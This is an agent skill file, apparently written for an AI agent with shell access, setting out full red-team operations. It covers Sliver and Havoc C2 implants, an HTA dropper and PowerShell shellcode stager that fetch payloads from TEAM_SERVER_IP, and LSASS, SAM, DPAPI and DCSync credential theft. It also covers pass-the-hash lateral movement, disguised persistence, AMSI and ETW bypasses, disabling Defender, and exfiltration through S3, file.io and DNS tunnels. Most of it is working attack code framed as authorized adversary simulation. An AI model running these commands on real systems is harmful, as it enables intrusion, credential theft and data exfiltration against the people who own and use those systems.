---
name: red-team
description: Red team operations — Sliver/Havoc C2, lateral movement, credential harvesting, persistence, defense evasion, exfiltration, OPSEC
allowed-tools: [Bash, Read, Write]
---

# Red Team Operations

Full-scope adversary simulation from initial foothold through objectives. Uses Sliver or Havoc
as the C2 framework depending on engagement requirements.

> **Authorization**: Written rules of engagement (ROE) required before any red team activity.
> Confirm: target scope, excluded systems, emergency stop contacts, and permitted techniques.

## Tools

| Tool | Purpose |
|------|---------|
| sliver | Open-source C2 framework (implants, listeners, armory) |
| havoc | Modern C2 framework with sleep obfuscation and OPSEC-safe post-ex |
| evil-winrm | WinRM shell for lateral movement |
| chisel | TCP/UDP tunnel over HTTP (SOCKS5 pivot) |
| ligolo-ng | Reverse tunnel for network pivoting |
| pypykatz | Pure-Python Mimikatz (LSASS dump parsing) |
| impacket suite | SMB, WMI, DCOM, DCSync, secretsdump |
| crackmapexec | Multi-protocol lateral movement and enumeration |
| bloodhound | AD attack path visualisation |
| neo4j | BloodHound database backend |
| procdump | LSASS dump via Sysinternals (Windows) |
| metasploit | Auxiliary modules, payload generation, post-ex |

## Phase 0 — Setup

### Install

```bash
sudo apt-get install -y sliver havoc evil-winrm chisel ligolo-ng bloodhound neo4j
pip3 install pypykatz impacket 2>/dev/null || true
```

### Sliver Team Server

```bash
# Start server (run on your operator machine or VPS)
sudo sliver-server

# Inside sliver-server console — generate operator config for client
new-operator --name operator1 --lhost TEAM_SERVER_IP --save /tmp/operator1.cfg

# Connect as client (separate terminal)
sliver --config /tmp/operator1.cfg

# Install community armory (BOFs, extensions, aliases)
armory install all
```

### Havoc Team Server

```bash
# First run — generates default profile
sudo havoc server --profile /usr/share/havoc/profiles/havoc.yaotl 2>&1 | tee "$OUTPUT_DIR/logs/havoc-server.log" &

# Connect client
havoc client

# Or build from source for latest features
# git clone https://github.com/HavocFramework/Havoc /opt/havoc
# cd /opt/havoc && make
```

---

## Phase 1 — Initial Access (Foothold)

Red team starts from a confirmed vulnerability from the pentest phase (WAPT/Network/MAPT).
Convert the finding into a C2 callback.

```bash
# From an existing RCE / file upload / SSRF-to-RCE finding:
# 1. Generate implant (see Phase 2)
# 2. Stage it on a web server
python3 -m http.server 8080 --directory "$OUTPUT_DIR/artifacts/payloads/" &

# 3. Execute via the confirmed vulnerability — examples:
# Command injection: curl "TARGET/ping?host=ATTACKER_IP:8080/implant.exe" -> downloads and runs
# File upload RCE:  upload implant as .jpg with double extension bypass
# SSRF-to-RCE:     force server to fetch implant from internal endpoint

# Capture callback in listener (see Phase 2)
```

---

## Phase 2 — C2 Implant Deployment

### Sliver — Generate Implants

```bash
# Inside sliver client
# ── HTTP implant (most bypasses EDR over common port)
generate --http TEAM_SERVER_IP:443 \
  --os windows --arch amd64 \
  --format exe \
  --name "update_helper" \
  --skip-symbols \
  --save "$OUTPUT_DIR/artifacts/payloads/"

# ── mTLS implant (encrypted, certificate-pinned)
generate --mtls TEAM_SERVER_IP:8888 \
  --os windows --arch amd64 \
  --format shellcode \
  --name "sc_mtls" \
  --save "$OUTPUT_DIR/artifacts/payloads/"

# ── DNS implant (firewall bypass via DNS channel)
generate --dns TEAM_SERVER_IP \
  --os linux --arch amd64 \
  --format elf \
  --name "update_daemon" \
  --save "$OUTPUT_DIR/artifacts/payloads/"

# ── Cross-platform (Linux pivot)
generate --mtls TEAM_SERVER_IP:8888 \
  --os linux --arch amd64 \
  --format elf \
  --name "svc_monitor" \
  --save "$OUTPUT_DIR/artifacts/payloads/"
```

### Sliver — Start Listeners

```bash
# Inside sliver client
mtls --lport 8888          # mTLS listener
https --lport 443          # HTTPS listener (needs TLS cert)
http --lport 80            # HTTP listener
dns --domains c2.domain.com  # DNS listener

# List active sessions
sessions

# Interact with a session
use SESSION_ID
```

### Havoc — Generate Demon Implants

```bash
# Inside Havoc client GUI:
# Attack → Payload → Demon
# Profile: select listener (HTTP/HTTPS/SMB)
# Config:
#   Sleep: 30s  Jitter: 30%
#   Inject: Self-injection (avoids CreateRemoteThread)
#   Sleep Technique: WaitForSingleObjectEx (evades timer-based detection)
#   Indirect Syscall: enabled
#   Stack Duplication: enabled
# Format: EXE / DLL / shellcode

# CLI equivalent (Havoc 0.6+)
havoc generate --profile /usr/share/havoc/profiles/havoc.yaotl \
  --listener HTTP \
  --format exe \
  --out "$OUTPUT_DIR/artifacts/payloads/demon.exe"
```

### Havoc — Start Listeners

```bash
# Inside Havoc client:
# View → Listeners → Add Listener
# Type: HTTP  Port: 443  Host: TEAM_SERVER_IP
# Callback: https://TEAM_SERVER_IP/updates/

# SMB listener for lateral movement (no network egress needed)
# Type: SMB  PipeName: \\.\pipe\UpdateService
```

### Payload Delivery

```bash
# HTA dropper (phishing / file share)
cat > "$OUTPUT_DIR/artifacts/payloads/payload.hta" << 'EOF'
<script language="VBScript">
  Set shell = CreateObject("WScript.Shell")
  shell.Run "powershell -nop -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://TEAM_SERVER_IP:8080/stager.ps1')"""
</script>
EOF

# PowerShell stager (download and inject shellcode)
cat > "$OUTPUT_DIR/artifacts/payloads/stager.ps1" << 'EOF'
$url = "http://TEAM_SERVER_IP:8080/sc_mtls.bin"
$sc  = (New-Object Net.WebClient).DownloadData($url)
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($sc.Length)
[System.Runtime.InteropServices.Marshal]::Copy($sc, 0, $mem, $sc.Length)
$t   = [System.Threading.Thread]::new([System.Threading.ThreadStart]::new(
    [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        $mem, [System.Action])))
$t.Start()
EOF

# Macro dropper document (Word/Excel VBA)
# Use macro_pack or EvilClippy for obfuscated VBA delivery (see armory)
```

---

## Phase 3 — Situational Awareness (Post-Foothold)

```bash
# Sliver — built-in recon commands (inside session)
whoami --all          # current user, groups, privileges
ps                    # process list (identify AV/EDR)
netstat               # active connections
ifconfig              # network interfaces
ls C:/               # file system browsing
cat C:/Windows/System32/drivers/etc/hosts

# Identify EDR/AV from process list
ps | grep -iE "defender|crowdstrike|cylance|sentinel|carbon|edr|av|endpoint"

# BloodHound — AD mapping (Sliver armory BOF)
sharphound           # runs SharpHound.exe via BOF (no disk write)
# Or from compromised host:
# .\SharpHound.exe -c All --outputdirectory C:\ProgramData\

# Download BloodHound output
download C:\ProgramData\*.zip "$OUTPUT_DIR/artifacts/bloodhound/"

# Ingest into BloodHound
sudo neo4j start
bloodhound &
# Import zip via BloodHound GUI → Upload Data
```

---

## Phase 4 — Credential Harvesting

### LSASS Dump (Windows)

```bash
# Method 1 — Sliver BOF (in-memory, minimal footprint)
# Inside Sliver session:
nanodump --pid LSASS_PID --write C:\ProgramData\dump.dmp
download C:\ProgramData\dump.dmp "$OUTPUT_DIR/artifacts/"
rm C:\ProgramData\dump.dmp

# Method 2 — Task Manager / ProcDump (noisier, detected by most EDR)
# Only use if no EDR present
procdump64.exe -ma lsass.exe "$OUTPUT_DIR/artifacts/lsass.dmp"

# Parse dump on attacker machine (no Windows required)
pypykatz lsa minidump "$OUTPUT_DIR/artifacts/lsass.dmp" \
  --json > "$OUTPUT_DIR/artifacts/lsass-creds.json"

cat "$OUTPUT_DIR/artifacts/lsass-creds.json" | \
  python3 -c "import sys,json; [print(e.get('username',''),e.get('nt','')) for r in json.load(sys.stdin).values() for e in r if e.get('nt')]"
```

### SAM / SYSTEM (Local Accounts)

```bash
# Via Sliver (registry hive backup)
# Inside session:
reg save HKLM\SAM C:\ProgramData\sam.bak
reg save HKLM\SYSTEM C:\ProgramData\sys.bak
download C:\ProgramData\sam.bak "$OUTPUT_DIR/artifacts/"
download C:\ProgramData\sys.bak "$OUTPUT_DIR/artifacts/"
rm C:\ProgramData\sam.bak
rm C:\ProgramData\sys.bak

# Parse locally
impacket-secretsdump -sam "$OUTPUT_DIR/artifacts/sam.bak" \
  -system "$OUTPUT_DIR/artifacts/sys.bak" LOCAL \
  | tee "$OUTPUT_DIR/artifacts/sam-creds.txt"
```

### DPAPI — Browser / App Credentials

```bash
# From Sliver session (SharpDPAPI via armory)
sharpDPAPI masterkeys         # extract masterkeys
sharpDPAPI credentials        # decrypt credential blobs
sharpDPAPI chrome --cookies   # Chrome/Edge cookies + passwords

# Manual DPAPI masterkey extraction
# Dump %APPDATA%\Microsoft\Protect\<SID>\ from compromised host
download "%APPDATA%\Microsoft\Protect" "$OUTPUT_DIR/artifacts/dpapi/"

# Decrypt with domain backup key (if DC compromised)
impacket-dpapi masterkey \
  -file "$OUTPUT_DIR/artifacts/dpapi/MASTERKEY_FILE" \
  -pvk "$OUTPUT_DIR/artifacts/domain-backup.pvk"
```

### Domain Secrets Extraction (if DC access)

```bash
# DCSync — impersonate DC replication (requires DA or replication privileges)
impacket-secretsdump DOMAIN/admin:password@DC_IP \
  -just-dc \
  -outputfile "$OUTPUT_DIR/artifacts/dcsync" \
  | tee "$OUTPUT_DIR/logs/dcsync.log"

# Extract KRBTGT hash (for Golden Ticket)
grep "krbtgt" "$OUTPUT_DIR/artifacts/dcsync.ntds"
```

---

## Phase 5 — Lateral Movement

### Pass-the-Hash / Pass-the-Ticket

```bash
NTLM_HASH="aad3b435b51404eeaad3b435b51404ee:HASH_HERE"
DOMAIN="corp.local"
DC_IP="10.10.10.1"
TARGET="10.10.10.50"

# WMI execution (no network share needed, less logged than PsExec)
impacket-wmiexec "$DOMAIN/administrator@$TARGET" -hashes "$NTLM_HASH"

# SMB PsExec (creates service — noisy)
impacket-psexec "$DOMAIN/administrator@$TARGET" -hashes "$NTLM_HASH"

# SMBExec (no binary drop, uses cmd.exe service)
impacket-smbexec "$DOMAIN/administrator@$TARGET" -hashes "$NTLM_HASH"

# CrackMapExec — sweep for valid hash across range
crackmapexec smb 10.10.10.0/24 -u administrator -H "$NTLM_HASH" --local-auth \
  --continue-on-success | tee "$OUTPUT_DIR/logs/pth-sweep.txt"
```

### WinRM / Evil-WinRM

```bash
# Valid credentials
evil-winrm -i TARGET_IP -u administrator -p 'Password123!'

# Pass-the-Hash
evil-winrm -i TARGET_IP -u administrator -H NTLM_HASH

# With HTTPS
evil-winrm -i TARGET_IP -u administrator -p 'Password123!' -S

# Upload implant via evil-winrm
evil-winrm -i TARGET_IP -u administrator -p 'Password123!'
# Inside shell: upload /path/to/demon.exe C:\ProgramData\demon.exe
# C:\ProgramData\demon.exe
```

### DCOM Lateral Movement

```bash
# DCOM via impacket (leaves less traces than PsExec)
impacket-dcomexec "$DOMAIN/administrator@$TARGET" 'cmd.exe /c whoami > C:\ProgramData\out.txt' \
  -hashes "$NTLM_HASH" -object MMC20

# DCOM MMC20.Application (most reliable DCOM method)
# Must be run from Sliver/Havoc session on Windows host:
# [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","TARGET")).Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c COMMAND","7")
```

### SSH Hopping (Linux)

```bash
# From compromised Linux host — hop to next target
ssh -i "$OUTPUT_DIR/artifacts/id_rsa" user@NEXT_TARGET

# SSH through Sliver session (port forward)
# Inside Sliver session:
portfwd add --remote NEXT_TARGET:22 --local 127.0.0.1:2222
# Then locally:
ssh -p 2222 user@127.0.0.1

# Harvest SSH keys from compromised host
download ~/.ssh/ "$OUTPUT_DIR/artifacts/ssh-keys/"
download /home/*/.ssh/ "$OUTPUT_DIR/artifacts/ssh-keys/"
```

### Network Pivoting

```bash
# Chisel — SOCKS5 proxy through HTTP
# On attacker:
chisel server --port 8888 --reverse

# On compromised host (via C2 execute-assembly or shell):
.\chisel.exe client ATTACKER_IP:8888 R:socks

# Route traffic through pivot
proxychains4 nmap -sT -Pn -p 22,80,443,445,3389 INTERNAL_RANGE

# Ligolo-ng (better performance, TUN interface)
# On attacker:
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert

# On compromised host:
.\agent.exe -connect ATTACKER_IP:11601 -ignore-cert

# Back on attacker — add route
# interface_id = list + select correct session
# tunnel_start --tun ligolo
sudo ip route add INTERNAL_SUBNET/24 dev ligolo
```

---

## Phase 6 — Persistence

### Windows — Scheduled Tasks

```bash
# Via Sliver session (execute-assembly or shell)
schtasks /create /sc ONLOGON \
  /tn "MicrosoftEdgeUpdateCore" \
  /tr "C:\ProgramData\update.exe" \
  /ru SYSTEM /f

schtasks /create /sc DAILY /st 09:00 \
  /tn "WindowsDefenderUpdate" \
  /tr "powershell -nop -w hidden -enc BASE64_PAYLOAD" \
  /ru SYSTEM /f

# Verify
schtasks /query /tn "MicrosoftEdgeUpdateCore"
```

### Windows — Registry Run Keys

```bash
# HKCU (user-level, no admin needed)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" \
  /v "OneDriveHelper" /t REG_SZ \
  /d "C:\ProgramData\helper.exe" /f

# HKLM (system-wide, needs admin)
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" \
  /v "SecurityHealth" /t REG_SZ \
  /d "C:\Windows\System32\update.exe" /f

# Verify
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
```

### Windows — WMI Event Subscription (fileless)

```bash
# Sliver armory — SharpWMI persistence (no disk artifact beyond WMI database)
# Inside Sliver session:
execute-assembly /opt/SharpWMI.exe action=create \
  name="WindowsUpdate" \
  query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'" \
  payload="powershell -nop -w hidden -enc BASE64_PAYLOAD"

# Manual via PowerShell
$filterArgs = @{
  Name = 'WindowsUpdate'
  EventNamespace = 'root\cimv2'
  QueryLanguage = 'WQL'
  Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}
$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $filterArgs
```

### Linux — Cron / Init

```bash
# Cron (user-level)
echo "*/5 * * * * /tmp/.cache/daemon >/dev/null 2>&1" | crontab -

# System-wide cron (needs root)
echo "*/10 * * * * root /usr/lib/.update >/dev/null 2>&1" >> /etc/crontab

# Systemd service (blend into legitimate services)
cat > /etc/systemd/system/systemd-update.service << 'EOF'
[Unit]
Description=System Update Service
After=network.target

[Service]
ExecStart=/usr/lib/.update
Restart=on-failure
RestartSec=30

[Install]
WantedBy=multi-user.target
EOF
systemctl enable systemd-update --now
```

### Linux — SSH Authorized Keys

```bash
# Add attacker public key
mkdir -p ~/.ssh && chmod 700 ~/.ssh
echo "SSH_PUBLIC_KEY_HERE" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

---

## Phase 7 — Defense Evasion

### AMSI Bypass (Windows — PowerShell)

```powershell
# Method 1 — Reflection (patched in newer PS versions)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Method 2 — Memory patch (more reliable)
$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b=$a.GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static')
$c=$b.GetValue($null)
[Runtime.InteropServices.Marshal]::WriteByte($c,0xEB)

# Method 3 — Via Sliver/Havoc (preferred — runs from C2, not PowerShell)
# Havoc: AMSI bypass is built into demon payload (indirect syscalls)
# Sliver armory: amsi-bypass BOF
amsi-bypass
```

### ETW (Event Tracing for Windows) Patching

```powershell
# Disable ETW in current process (prevents Sysmon Event ID 8 for injections)
$patch = [Byte[]] (0xC3)
$addr  = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    ([Diagnostics.Process]::GetCurrentProcess().Modules | Where-Object {$_.ModuleName -eq 'ntdll.dll'}).BaseAddress +
    [int](Get-ProcAddress ntdll.dll EtwEventWrite), [Func[IntPtr,Int32]])
```

### Process Injection (Shellcode)

```powershell
# Sliver armory — inject BOF (inject shellcode into remote process)
# Inside Sliver session:
inject --pid TARGET_PID --shellcode "$OUTPUT_DIR/artifacts/payloads/sc_mtls.bin"

# Havoc — process injection built-in
# Demons can self-inject or inject into a target PID via GUI
```

### EDR Detection — Identify Before Evading

```bash
# From Sliver ps output — flag known EDR processes
ps | grep -iE "MsMpEng|SenseIR|CSFalconService|CylanceSvc|SentinelAgent|CarbonBlack|cb|edr|AvastSvc|avp|bdagent"

# Common EDR → evasion approach
# Defender → AMSI bypass + process injection into trusted proc (explorer, svchost)
# CrowdStrike → indirect syscalls + sleep obfuscation (Havoc default)
# SentinelOne → process hollowing or DLL sideloading
# Carbon Black → reflective DLL injection

# Sliver — detect hooks (identify userland API hooking)
unhook --process-name explorer.exe
```

### Disable Windows Defender (if admin, no EDR)

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -ExclusionPath "C:\ProgramData"
```

---

## Phase 8 — Exfiltration

### HTTPS (C2 channel — preferred)

```bash
# All data flows through existing C2 implant — use C2 download command
# Sliver:
download C:\sensitive\data.zip "$OUTPUT_DIR/artifacts/exfil/"

# Havoc:
# fs download [session] [remote path] [local path]
```

### DNS Tunneling (firewall bypass)

```bash
# dnscat2 server on attacker
dnscat2-server --dns "domain=tunnel.c2domain.com,host=ATTACKER_IP"

# On compromised host (via C2 shell exec):
.\dnscat.exe --dns "domain=tunnel.c2domain.com"

# Sliver DNS implant handles this automatically via --dns listener
```

### Cloud Storage (blends with normal traffic)

```bash
# Stage data to AWS S3 (if AWS CLI available on compromised host)
aws s3 cp C:\exfil.zip s3://ATTACKER_BUCKET/ --no-sign-request

# Or via PowerShell to generic HTTPS endpoint
Invoke-RestMethod -Uri "https://file.io/?expires=1d" \
  -Method Post -InFile C:\sensitive.zip

# Download result URL from attacker machine
```

### Steganography (embed data in image)

```bash
# On attacker — embed data in PNG
steghide embed -cf decoy.jpg -ef "$OUTPUT_DIR/artifacts/exfil/data.zip" \
  -p "PASSPHRASE" -f

# Exfil the image via C2 or email
# Extract on attacker
steghide extract -sf decoy.jpg -p "PASSPHRASE" -f
```

---

## Phase 9 — C2 Traffic Profiling

### Sliver — HTTP C2 Profile

```bash
# Create a profile that mimics Microsoft update traffic
# Inside sliver-server: implant-profiles new --http TEAM_SERVER_IP
# Edit the generated profile YAML:

cat > "$OUTPUT_DIR/artifacts/c2-profile.yaml" << 'EOF'
implant_config:
  is_beacon: true
  beacon_interval: 30s
  beacon_jitter: 30
  connection_strategy: random
  c2:
    - url: https://TEAM_SERVER_IP/api/v2/update
      headers:
        User-Agent: "Microsoft BITS/7.8"
        Accept: "*/*"
        Content-Type: "application/octet-stream"
      poll_timeout: 5s
      poll_jitter: 3s
EOF
```

### Havoc — Listener OPSEC Profile

```bash
# Edit /usr/share/havoc/profiles/havoc.yaotl to blend traffic
# Key settings:
# Listener.Hosts         = ["cdn.microsoft.com"]  # domain fronting host header
# Listener.HostBind      = "0.0.0.0"
# Listener.PortBind      = 443
# Listener.UserAgent     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ..."
# Listener.Uris          = ["/static/js/main.chunk.js", "/api/v1/session"]
# Sleep.Method           = "WaitForSingleObjectEx"
# Sleep.Jitter           = 30
```

### Domain Fronting (route C2 through CDN)

```bash
# Cloudfront / Fastly fronting:
# 1. Register a domain and point to Cloudfront distribution
# 2. Cloudfront forwards requests to TEAM_SERVER_IP based on origin header
# 3. Implant connects to cdn.domain.com (public CDN IP)
#    with Host header pointing to your Cloudfront distribution

# In Sliver — set host header:
# generate --http CLOUDFRONT_DOMAIN/updates --host-header TEAM_SERVER_ORIGIN.cloudfront.net

# Verify traffic routing
curl -H "Host: TEAM_SERVER_ORIGIN.cloudfront.net" \
  "https://CLOUDFRONT_DOMAIN/api/v2/update" -v 2>&1 | head -30
```

### JA3 Evasion

```bash
# Havoc uses custom TLS fingerprints to avoid JA3-based detection
# Demon payload configures TLS in cipher suite order matching Firefox/Chrome

# Verify JA3 fingerprint of your C2
ja3sum.py --pcap "$OUTPUT_DIR/artifacts/c2-traffic.pcap" 2>/dev/null || \
  tshark -r "$OUTPUT_DIR/artifacts/c2-traffic.pcap" \
    -Y "ssl.handshake.type==1" \
    -T fields -e ip.dst -e ssl.handshake.ciphersuite \
    | head -10
```

---

## OPSEC Checklist

Run this checklist before and after every phase. Document each item in `attack-chain.md`.

### Pre-Operation

- [ ] Confirm ROE and scope in writing — get written authorization
- [ ] Verify team server IP not in threat intel feeds (check Shodan, VirusTotal)
- [ ] Use a fresh VPS / redirector — never expose team server IP directly
- [ ] Confirm C2 profile mimics legitimate traffic (user-agent, URI patterns, intervals)
- [ ] Test implant against target AV/EDR in a VM before deployment
- [ ] Set beacon intervals ≥ 30s with ≥ 30% jitter (avoid periodic polling signatures)

### During Operation

- [ ] Avoid running as SYSTEM unless necessary — blend with user context
- [ ] Prefer in-memory execution over disk writes
- [ ] Delete staging files immediately after execution
- [ ] Use `evasive` process injection (avoiding CreateRemoteThread — use QueueUserAPC or NtQueueApcThread)
- [ ] Avoid LSASS direct read — use task manager method or handle duplication
- [ ] Monitor for Blue Team response — watch for new processes (EDR agents), log clearing, account lockouts

### Log Sources to Avoid Triggering

| Log Source | Trigger | Mitigation |
|---|---|---|
| Sysmon Event 1 | Process creation | Use parent process spoofing |
| Sysmon Event 3 | Network connection | Use HTTPS + domain fronting |
| Sysmon Event 8 | CreateRemoteThread | Use indirect injection (NtCreateThreadEx, APC) |
| Sysmon Event 11 | File creation | Operate in-memory; delete staging files immediately |
| Windows Event 4624 | Logon | Use Pass-the-Ticket over Pass-the-Hash |
| Windows Event 4698 | Scheduled task created | Use WMI subscription instead |
| Windows Event 7045 | Service installed | Prefer schtasks or WMI over service-based execution |
| PowerShell Event 4103/4104 | Script block logging | Use BOFs or .NET assemblies, avoid PS when EDR is present |

### Post-Operation — Cleanup

```bash
# Remove scheduled tasks
schtasks /delete /tn "MicrosoftEdgeUpdateCore" /f

# Remove registry keys
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "OneDriveHelper" /f

# Remove WMI subscriptions
Get-WMIObject -Namespace root\subscription -Class __EventFilter | Remove-WmiObject

# Remove files
del /f /q C:\ProgramData\demon.exe C:\ProgramData\update.exe

# Clear prefetch (Windows)
del /f /q C:\Windows\Prefetch\*.pf 2>nul

# Remove SSH key (Linux)
sed -i '/ATTACKER_PUBLIC_KEY/d' ~/.ssh/authorized_keys

# Remove cron
crontab -l | grep -v ".cache/daemon" | crontab -

# Disable and remove systemd service (Linux)
systemctl disable systemd-update --now
rm /etc/systemd/system/systemd-update.service
systemctl daemon-reload
```

---

## Output Structure

```
OUTPUT_DIR/
├── recon/
│   ├── bloodhound/          ← SharpHound zip + ingested graph exports
│   └── ad-map.json          ← manual AD enumeration notes
├── artifacts/
│   ├── payloads/            ← generated implants (NEVER commit)
│   ├── exfil/               ← exfiltrated data (NEVER commit)
│   ├── lsass-creds.json     ← parsed LSASS dump (NEVER commit)
│   ├── dcsync.ntds          ← DCSync output (NEVER commit)
│   └── c2-profile.yaml      ← C2 listener profile
├── findings/
│   └── finding-NNN/         ← each demonstrated objective (credential harvest, DA, etc.)
├── logs/
│   ├── sliver-sessions.log  ← session IDs, callbacks, commands
│   ├── havoc-server.log     ← Havoc team server output
│   └── lateral-movement.ndjson ← structured lateral move log
└── attack-chain.md          ← living narrative: objectives, path, evidence
```

> **Never commit:** payloads/, exfil/, any credential dump, .ntds files, LSASS dumps.
> All sensitive artifacts stay in OUTPUT_DIR and are excluded by `.gitignore`.

---

## Deep-dive references (authoritative)

The inline sections above are **quick-start orchestration**. For real testing of any area below, the `reference/` file is the **source of truth** (curated from disclosed reports — payloads, bypass tables, chain templates). Load it before deep testing; don't rely on the quick-start commands alone.

- `reference/redteam-mindset.md` — Red-team operator discipline — the mindset corrections that separate offensive testing from defensive WAPT.
